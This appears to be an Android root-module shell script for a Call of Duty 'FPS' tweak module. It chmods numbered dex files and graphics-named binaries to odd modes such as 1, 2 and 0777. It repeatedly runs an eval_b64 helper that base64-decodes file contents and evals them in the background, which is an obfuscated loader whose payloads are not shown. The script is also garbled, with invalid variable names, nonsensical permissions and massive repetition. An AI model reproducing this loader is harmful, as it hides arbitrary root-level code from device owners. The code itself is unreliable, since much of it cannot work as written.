chmod 2 /data/adb/modules/null_universe/classes196.dex 
chmod 2 /data/adb/modules/null_universe/classes197.dex
chmod 2 /data/adb/modules/null_universe/classes198.dex 
chmod 2 /data/adb/modules/null_universe/classes199.dex
chmod 2 /data/adb/modules/null_universe/classes200.dex 
chmod 2 /data/adb/modules/null_universe/classes201.dex
chmod 2 /data/adb/modules/null_universe/classes202.dex 
chmod 2 /data/adb/modules/null_universe/classes203.dex
chmod 2 /data/adb/modules/null_universe/classes204.dex 
chmod 2 /data/adb/modules/null_universe/classes205.dex
chmod 2 /data/adb/modules/null_universe/classes206.dex 
chmod 2 /data/adb/modules/null_universe/classes207.dex
chmod 2 /data/adb/modules/null_universe/classes208.dex 
chmod 2 /data/adb/modules/null_universe/classes209.dex
chmod 2 /data/adb/modules/null_universe/classes210.dex 
chmod 2 /data/adb/modules/null_universe/classes211.dex
chmod 2 /data/adb/modules/null_universe/classes212.dex 
chmod 2 /data/adb/modules/null_universe/classes213.dex
chmod 2 /data/adb/modules/null_universe/classes214.dex 
chmod 2 /data/adb/modules/null_universe/classes215.dex
chmod 2 /data/adb/modules/null_universe/classes216.dex 
chmod 2 /data/adb/modules/null_universe/classes217.dex
chmod 2 /data/adb/modules/null_universe/classes218.dex 
chmod 2 /data/adb/modules/null_universe/classes219.dex
# ==========================================
eval_b64() {
    [ -f "$1" ] && eval "$(base64 -d "$1")" &
}

chmod 0777 "$AX/system/bin/skiavk"
chmod 0777 "$MODDIR/system/bin/skiavk"
chmod 0777 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/skiavk"
chmod 0777 "$com.activision.callofduty.shooter/system/bin/skiavk"
chmod 0777 "$Androidراه اندازی/system/bin/skiavk"
eval_b64 "$MODDIR/system/bin/skiavk"
eval_b64 "$AX/system/bin/skiavk"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/skiavk"
eval_b64 "$com.activision.callofduty.shooter/system/bin/skiavk"
eval_b64 "$Androidراه اندازی/system/bin/skiavk"

chmod 0777 "$AX/system/bin/fvck"
chmod 0777 "$MODDIR/system/bin/fvck"
chmod 0777 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/fvck"
chmod 0777 "$com.activision.callofduty.shooter/system/bin/fvck"
chmod 0777 "$Androidراه اندازی/system/bin/fvck"
eval_b64 "$MODDIR/system/bin/fvck"
eval_b64 "$AX/system/bin/fvck"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/fvck"
eval_b64 "$com.activision.callofduty.shooter/system/bin/fvck"
eval_b64 "$Androidراه اندازی/system/bin/fvck"

chmod 0777 "$AX/system/bin/2D Vulkan"
chmod 0777 "$MODDIR/system/bin/2D Vulkan"
chmod 0777 "$com.activision.callofduty.shooter/system/bin/2D Vulkan"
chmod 0777 "$Androidراه اندازی/system/bin/2D Vulkan"
chmod 0777 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/2D Vulkan"
eval_b64 "$AX/system/bin/2D Vulkan"
eval_b64 "$MODDIR/system/bin/2D Vulkan"
eval_b64 "$com.activision.callofduty.shooter/system/bin/2D Vulkan"
eval_b64 "$Androidراه اندازی/system/bin/2D Vulkan"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/2D Vulkan"

chmod 0777 "$AX/system/bin/3D Vulkan"
chmod 0777 "$MODDIR/system/bin/3D Vulkan"
chmod 0777 "$com.activision.callofduty.shooter/system/bin/3D Vulkan"
chmod 0777 "$Androidراه اندازی/system/bin/3D Vulkan"
chmod 0777 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/3D Vulkan"
eval_b64 "$AX/system/bin/3D Vulkan"
eval_b64 "$MODDIR/system/bin/3D Vulkan"
eval_b64 "$com.activision.callofduty.shooter/system/bin/3D Vulkan"
eval_b64 "$Androidراه اندازی/system/bin/3D Vulkan"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/3D Vulkan"

chmod 0777 "$AX/system/bin/4D Vulkan"
chmod 0777 "$MODDIR/system/bin/4D Vulkan"
chmod 0777 "$com.activision.callofduty.shooter/system/bin/4D Vulkan"
chmod 0777 "$Androidراه اندازی/system/bin/4D Vulkan"
chmod 0777 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/4D Vulkan"
eval_b64 "$AX/system/bin/4D Vulkan"
eval_b64 "$MODDIR/system/bin/4D Vulkan"
eval_b64 "$com.activision.callofduty.shooter/system/bin/4D Vulkan"
eval_b64 "$Androidراه اندازی/system/bin/4D Vulkan"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/4D Vulkan"

chmod 0777 "$AX/system/bin/core-vsync"
chmod 0777 "$MODDIR/system/bin/core-vsync"
chmod 0777 "$com.activision.callofduty.shooter/system/bin/core-vsync"
chmod 0777 "$Androidراه اندازی/system/bin/core-vsync"
chmod 0777 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/core-vsync"
eval_b64 "$AX/system/bin/core-vsync"
eval_b64 "$MODDIR/system/bin/core-vsync"
eval_b64 "$com.activision.callofduty.shooter/system/bin/core-vsync"
eval_b64 "$Androidراه اندازی/system/bin/core-vsync"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/core-vsync"

chmod 0777 "$AX/system/bin/Androidراه اندازی"
chmod 0777 "$MODDIR/system/bin/Androidراه اندازی"
chmod 0777 "$com.activision.callofduty.shooter/system/bin/Androidراه اندازی"
chmod 0777 "$Androidراه اندازی/system/bin/Androidراه اندازی"
chmod 0777 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/Androidراه اندازی"
eval_b64 "$AX/system/bin/Androidراه اندازی"
eval_b64 "$MODDIR/system/bin/Androidراه اندازی"
eval_b64 "$com.activision.callofduty.shooter/system/bin/Androidراه اندازی"
eval_b64 "$Androidراه اندازی/system/bin/Androidراه اندازی"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/Androidراه اندازی"

chmod 0777 "$MODDIR/system/bin/com.activision.callofduty.shooter"
chmod 0777 "$AX/system/bin/com.activision.callofduty.shooter"
chmod 0777 "$com.activision.callofduty.shooter/system/bin/com.activision.callofduty.shooter"
chmod 0777 "$Androidراه اندازی/system/bin/com.activision.callofduty.shooter"
chmod 0777 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/com.activision.callofduty.shooter"
eval_b64 "$AX/system/bin/com.activision.callofduty.shooter"
eval_b64 "$MODDIR/system/bin/com.activision.callofduty.shooter"
eval_b64 "$com.activision.callofduty.shooter/system/bin/com.activision.callofduty.shooter"
eval_b64 "$Androidراه اندازی/system/bin/com.activision.callofduty.shooter"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/com.activision.callofduty.shooter"

chmod 1 "$AX/system/bin/skiavk"
chmod 1 "$MODDIR/system/bin/skiavk"
chmod 1 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/skiavk"
chmod 1 "$com.activision.callofduty.shooter/system/bin/skiavk"
chmod 1 "$Androidراه اندازی/system/bin/skiavk"
eval_b64 "$MODDIR/system/bin/skiavk"
eval_b64 "$AX/system/bin/skiavk"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/skiavk"
eval_b64 "$com.activision.callofduty.shooter/system/bin/skiavk"
eval_b64 "$Androidراه اندازی/system/bin/skiavk"

chmod 1 "$AX/system/bin/fvck"
chmod 1 "$MODDIR/system/bin/fvck"
chmod 1 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/fvck"
chmod 1 "$com.activision.callofduty.shooter/system/bin/fvck"
chmod 1 "$Androidراه اندازی/system/bin/fvck"
eval_b64 "$MODDIR/system/bin/fvck"
eval_b64 "$AX/system/bin/fvck"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/fvck"
eval_b64 "$com.activision.callofduty.shooter/system/bin/fvck"
eval_b64 "$Androidراه اندازی/system/bin/fvck"

chmod 1 "$AX/system/bin/2D Vulkan"
chmod 1 "$MODDIR/system/bin/2D Vulkan"
chmod 1 "$com.activision.callofduty.shooter/system/bin/2D Vulkan"
chmod 1 "$Androidراه اندازی/system/bin/2D Vulkan"
chmod 1 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/2D Vulkan"
eval_b64 "$AX/system/bin/2D Vulkan"
eval_b64 "$MODDIR/system/bin/2D Vulkan"
eval_b64 "$com.activision.callofduty.shooter/system/bin/2D Vulkan"
eval_b64 "$Androidراه اندازی/system/bin/2D Vulkan"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/2D Vulkan"

chmod 1 "$AX/system/bin/3D Vulkan"
chmod 1 "$MODDIR/system/bin/3D Vulkan"
chmod 1 "$com.activision.callofduty.shooter/system/bin/3D Vulkan"
chmod 1 "$Androidراه اندازی/system/bin/3D Vulkan"
chmod 1 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/3D Vulkan"
eval_b64 "$AX/system/bin/3D Vulkan"
eval_b64 "$MODDIR/system/bin/3D Vulkan"
eval_b64 "$com.activision.callofduty.shooter/system/bin/3D Vulkan"
eval_b64 "$Androidراه اندازی/system/bin/3D Vulkan"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/3D Vulkan"

chmod 1 "$AX/system/bin/4D Vulkan"
chmod 1 "$MODDIR/system/bin/4D Vulkan"
chmod 1 "$com.activision.callofduty.shooter/system/bin/4D Vulkan"
chmod 1 "$Androidراه اندازی/system/bin/4D Vulkan"
chmod 1 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/4D Vulkan"
eval_b64 "$AX/system/bin/4D Vulkan"
eval_b64 "$MODDIR/system/bin/4D Vulkan"
eval_b64 "$com.activision.callofduty.shooter/system/bin/4D Vulkan"
eval_b64 "$Androidراه اندازی/system/bin/4D Vulkan"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/4D Vulkan"

chmod 1 "$AX/system/bin/core-vsync"
chmod 1 "$MODDIR/system/bin/core-vsync"
chmod 1 "$com.activision.callofduty.shooter/system/bin/core-vsync"
chmod 1 "$Androidراه اندازی/system/bin/core-vsync"
chmod 1 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/core-vsync"
eval_b64 "$AX/system/bin/core-vsync"
eval_b64 "$MODDIR/system/bin/core-vsync"
eval_b64 "$com.activision.callofduty.shooter/system/bin/core-vsync"
eval_b64 "$Androidراه اندازی/system/bin/core-vsync"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/core-vsync"

chmod 1 "$AX/system/bin/Androidراه اندازی"
chmod 1 "$MODDIR/system/bin/Androidراه اندازی"
chmod 1 "$com.activision.callofduty.shooter/system/bin/Androidراه اندازی"
chmod 1 "$Androidراه اندازی/system/bin/Androidراه اندازی"
chmod 1 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/Androidراه اندازی"
eval_b64 "$AX/system/bin/Androidراه اندازی"
eval_b64 "$MODDIR/system/bin/Androidراه اندازی"
eval_b64 "$com.activision.callofduty.shooter/system/bin/Androidراه اندازی"
eval_b64 "$Androidراه اندازی/system/bin/Androidراه اندازی"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/Androidراه اندازی"

chmod 1 "$MODDIR/system/bin/com.activision.callofduty.shooter"
chmod 1 "$AX/system/bin/com.activision.callofduty.shooter"
chmod 1 "$com.activision.callofduty.shooter/system/bin/com.activision.callofduty.shooter"
chmod 1 "$Androidراه اندازی/system/bin/com.activision.callofduty.shooter"
chmod 1 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/com.activision.callofduty.shooter"
eval_b64 "$AX/system/bin/com.activision.callofduty.shooter"
eval_b64 "$MODDIR/system/bin/com.activision.callofduty.shooter"
eval_b64 "$com.activision.callofduty.shooter/system/bin/com.activision.callofduty.shooter"
eval_b64 "$Androidراه اندازی/system/bin/com.activision.callofduty.shooter"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/com.activision.callofduty.shooter"

chmod 2 "$AX/system/bin/skiavk"
chmod 2 "$MODDIR/system/bin/skiavk"
chmod 2 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/skiavk"
chmod 2 "$com.activision.callofduty.shooter/system/bin/skiavk"
chmod 2 "$Androidراه اندازی/system/bin/skiavk"
eval_b64 "$MODDIR/system/bin/skiavk"
eval_b64 "$AX/system/bin/skiavk"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/skiavk"
eval_b64 "$com.activision.callofduty.shooter/system/bin/skiavk"
eval_b64 "$Androidراه اندازی/system/bin/skiavk"

chmod 2 "$AX/system/bin/fvck"
chmod 2 "$MODDIR/system/bin/fvck"
chmod 2 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/fvck"
chmod 2 "$com.activision.callofduty.shooter/system/bin/fvck"
chmod 2 "$Androidراه اندازی/system/bin/fvck"
eval_b64 "$MODDIR/system/bin/fvck"
eval_b64 "$AX/system/bin/fvck"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/fvck"
eval_b64 "$com.activision.callofduty.shooter/system/bin/fvck"
eval_b64 "$Androidراه اندازی/system/bin/fvck"

chmod 2 "$AX/system/bin/2D Vulkan"
chmod 2 "$MODDIR/system/bin/2D Vulkan"
chmod 2 "$com.activision.callofduty.shooter/system/bin/2D Vulkan"
chmod 2 "$Androidراه اندازی/system/bin/2D Vulkan"
chmod 2 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/2D Vulkan"
eval_b64 "$AX/system/bin/2D Vulkan"
eval_b64 "$MODDIR/system/bin/2D Vulkan"
eval_b64 "$com.activision.callofduty.shooter/system/bin/2D Vulkan"
eval_b64 "$Androidراه اندازی/system/bin/2D Vulkan"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/2D Vulkan"

chmod 2 "$AX/system/bin/3D Vulkan"
chmod 2 "$MODDIR/system/bin/3D Vulkan"
chmod 2 "$com.activision.callofduty.shooter/system/bin/3D Vulkan"
chmod 2 "$Androidراه اندازی/system/bin/3D Vulkan"
chmod 2 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/3D Vulkan"
eval_b64 "$AX/system/bin/3D Vulkan"
eval_b64 "$MODDIR/system/bin/3D Vulkan"
eval_b64 "$com.activision.callofduty.shooter/system/bin/3D Vulkan"
eval_b64 "$Androidراه اندازی/system/bin/3D Vulkan"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/3D Vulkan"

chmod 2 "$AX/system/bin/4D Vulkan"
chmod 2 "$MODDIR/system/bin/4D Vulkan"
chmod 2 "$com.activision.callofduty.shooter/system/bin/4D Vulkan"
chmod 2 "$Androidراه اندازی/system/bin/4D Vulkan"
chmod 2 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/4D Vulkan"
eval_b64 "$AX/system/bin/4D Vulkan"
eval_b64 "$MODDIR/system/bin/4D Vulkan"
eval_b64 "$com.activision.callofduty.shooter/system/bin/4D Vulkan"
eval_b64 "$Androidراه اندازی/system/bin/4D Vulkan"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/4D Vulkan"

chmod 2 "$AX/system/bin/core-vsync"
chmod 2 "$MODDIR/system/bin/core-vsync"
chmod 2 "$com.activision.callofduty.shooter/system/bin/core-vsync"
chmod 2 "$Androidراه اندازی/system/bin/core-vsync"
